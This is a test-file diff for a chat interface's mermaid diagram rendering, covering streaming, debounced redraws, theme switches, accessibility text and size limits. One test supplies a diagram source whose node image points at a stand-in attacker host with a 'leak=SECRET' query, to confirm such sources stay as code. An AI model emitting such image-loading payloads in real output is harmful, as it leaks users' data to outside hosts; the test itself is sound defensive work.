@@ -265,6 +265,128 @@ describe("```mermaid fences", () => {
     expect(asked).toEqual([FLOW]);
   });
 
+  test("a diagram already drawn stays drawn while the answer pauses on a blank line", async () => {
+    const answer = `Olha:\n\n${fence(FLOW)}\n\nDepois do deploy.`;
+    const view = render(<MessageBody body={`${answer} E`} live />);
+    await settle();
+    // The reveal stops after whole words and their spaces: at a paragraph break the whole answer is the tail.
+    view.rerender(<MessageBody body={`${answer}\n\n`} live />);
+    await settle();
+    const el = view.container;
+    expect(el.querySelector(".md--tail .code-card__preview img")).not.toBeNull();
+    expect(el.querySelector(".code-card__code")).toBeNull();
+    expect(asked).toEqual([FLOW]);
+  });
+
+  /** What the fake drew for a source, as found in the image. */
+  const drawingOf = (source: string) => `<text>${source.length}</text>`;
+  const shown = (el: Element) => svgOf(el.querySelector(".code-card__preview img"));
+  const pause = (ms: number) => act(() => new Promise<void>((resolve) => setTimeout(resolve, ms)));
+
+  test("typing in a diagram keeps its last drawing on screen and draws again once the typing stops", async () => {
+    const view = render(<Markdown source={fence(FLOW)} />);
+    await settle();
+    const el = view.container;
+    for (const typed of ["!", "!!", "!!!"]) {
+      view.rerender(<Markdown source={fence(`${FLOW}${typed}`)} />);
+      await settle();
+      expect(shown(el)).toContain(drawingOf(FLOW));
+      expect(el.querySelector(".code-card__code")).toBeNull();
+    }
+    await pause(350);
+    await settle();
+    expect(shown(el)).toContain(drawingOf(`${FLOW}!!!`));
+    expect(asked).toEqual([FLOW, `${FLOW}!!!`]);
+  });
+
+  test("drawings waiting their turn are dropped when their block is gone", async () => {
+    const waiting: (() => void)[] = [];
+    setMermaidRenderer(
+      (_id, source) =>
+        new Promise((resolve) => {
+          asked.push(source);
+          waiting.push(() => resolve(`<svg xmlns="http://www.w3.org/2000/svg">${drawingOf(source)}</svg>`));
+        }),
+    );
+    const sources = ["flowchart LR\n  A --> B", "flowchart LR\n  C --> D", "flowchart LR\n  E --> F"];
+    const view = render(<Markdown source={sources.map(fence).join("\n\n")} />);
+    await settle();
+    // The first is being drawn and the others wait behind it when the page is left.
+    expect(asked).toEqual([sources[0] ?? ""]);
+    view.unmount();
+    for (const done of waiting) done();
+    await settle();
+    expect(asked).toEqual([sources[0] ?? ""]);
+  });
+
+  test("the same diagram twice on a page is drawn once", async () => {
+    const el = render(<Markdown source={`${fence(FLOW)}\n\nDe novo:\n\n${fence(FLOW)}`} />).container;
+    await settle();
+    expect(el.querySelectorAll(".code-card__preview img")).toHaveLength(2);
+    expect(asked).toEqual([FLOW]);
+  });
+
+  test("switching theme keeps the drawing on screen until the other theme's is ready", async () => {
+    setMermaidRenderer(async (_id, source, dark) => {
+      asked.push(`${dark ? "dark" : "light"}: ${source}`);
+      return `<svg xmlns="http://www.w3.org/2000/svg"><text>${dark ? "dark" : "light"}</text></svg>`;
+    });
+    const el = render(<Markdown source={fence(FLOW)} />).container;
+    await settle();
+    expect(shown(el)).toContain("<text>light</text>");
+    const html = document.documentElement;
+    try {
+      await act(async () => {
+        html.dataset.theme = "dark";
+      });
+      await settle();
+      expect(shown(el)).toContain("<text>light</text>");
+      await pause(350);
+      await settle();
+      expect(shown(el)).toContain("<text>dark</text>");
+      expect(asked).toEqual([`light: ${FLOW}`, `dark: ${FLOW}`]);
+    } finally {
+      await act(async () => {
+        delete html.dataset.theme;
+      });
+    }
+  });
+
+  test("the diagram's accTitle and accDescr name and describe its image", async () => {
+    setMermaidRenderer(
+      async () =>
+        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 80"><title id="chart-title-mmd-1">Fluxo de deploy</title><desc id="chart-desc-mmd-1">Do pedido &amp; aprovação ao deploy</desc><g><title>nó</title></g></svg>',
+    );
+    const el = render(<Markdown source={fence(`${FLOW}\n  accTitle: Fluxo de deploy`)} />).container;
+    await settle();
+    const img = el.querySelector(".code-card__preview img");
+    expect(img?.getAttribute("alt")).toBe("Fluxo de deploy");
+    expect(img?.getAttribute("aria-description")).toBe("Do pedido & aprovação ao deploy");
+  });
+
+  test("a source that would make the page load something never reaches mermaid and stays code", async () => {
+    const image = 'flowchart TD\n  A@{ img: "https://attacker.invalid/p.png?leak=SECRET" }';
+    const view = render(<MessageBody body={`Veja:\n\n${fence(image)}`} />);
+    await settle();
+    expect(asked).toEqual([]);
+    expect(view.container.querySelector(".code-card__code")?.textContent).toBe(image);
+    expect(view.container.querySelector("img")).toBeNull();
+    // A front matter with only a title still draws.
+    const titled = `---\ntitle: Fluxo\n---\n${FLOW}`;
+    view.rerender(<MessageBody body={fence(titled)} />);
+    await settle();
+    expect(asked).toEqual([titled]);
+    expect(view.container.querySelector(".code-card__preview img")).not.toBeNull();
+  });
+
+  test("a diagram longer than mermaid draws stays code", async () => {
+    const long = `flowchart LR\n  A[${"x".repeat(50_000)}] --> B`;
+    const el = render(<Markdown source={fence(long)} />).container;
+    await settle();
+    expect(asked).toEqual([]);
+    expect(el.querySelector(".code-card__code")).not.toBeNull();
+  });
+
   test("a page with no mermaid fence never loads mermaid", async () => {
     render(<Markdown source={"# Notas\n\nTexto.\n\n```ts\nconst a = 1;\n```\n\n- item"} />);
     render(<MessageBody body={"Oi **time**\n\n```\nflowchart LR\n  A --> B\n```"} />);
